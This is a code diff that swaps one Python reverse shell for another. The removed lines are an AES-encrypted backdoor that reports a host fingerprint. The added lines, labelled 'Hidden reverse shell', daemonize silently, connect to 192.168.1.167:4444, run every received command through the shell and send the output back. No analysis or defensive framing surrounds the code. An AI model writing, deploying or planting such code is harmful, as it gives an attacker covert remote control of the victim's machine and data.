@@ -1,27 +1,58 @@
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import socket, subprocess, os, platform, time
+#!/usr/bin/env python3
+# Hidden reverse shell - runs as inline command
+import socket,subprocess,os,time,sys
 
-KEY = b'ThisIsA16ByteKey'  # Rotate per session
-IV = KEY  # For CBC mode
-
-def encrypt(data): return AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(data.encode(), AES.block_size))
-def decrypt(data): return unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(data), AES.block_size).decode()
-
-def fingerprint(): return f"{platform.system()}|{platform.node()}|{platform.machine()}"
+def daemonize():
+    """Run as background daemon"""
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError:
+        sys.exit(1)
+    
+    os.chdir("/")
+    os.setsid()
+    os.umask(0)
+    
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError:
+        sys.exit(1)
+    
+    sys.stdout.flush()
+    sys.stderr.flush()
 
 def connect():
+    """Main connection loop - completely silent"""
     while True:
         try:
             s = socket.socket()
+            s.settimeout(30)
             s.connect(("192.168.1.167", 4444))
-            s.send(encrypt(fingerprint()))
+            s.send(b"READY")
+            
             while True:
-                cmd = decrypt(s.recv(1024))
-                if cmd == "exit": break
-                out = subprocess.getoutput(cmd)
-                s.send(encrypt(out))
-        except: time.sleep(10)
+                data = s.recv(1024).decode().strip()
+                if not data:
+                    continue
+                if data == 'exit':
+                    break
+                result = subprocess.run(data, shell=True, capture_output=True, text=True)
+                output = result.stdout + result.stderr
+                s.send(output.encode())
+                
+        except:
+            time.sleep(30)
+            continue
+        finally:
+            try:
+                s.close()
+            except:
+                pass
 
-connect()
-
+if __name__ == "__main__":
+    daemonize()
+    connect()
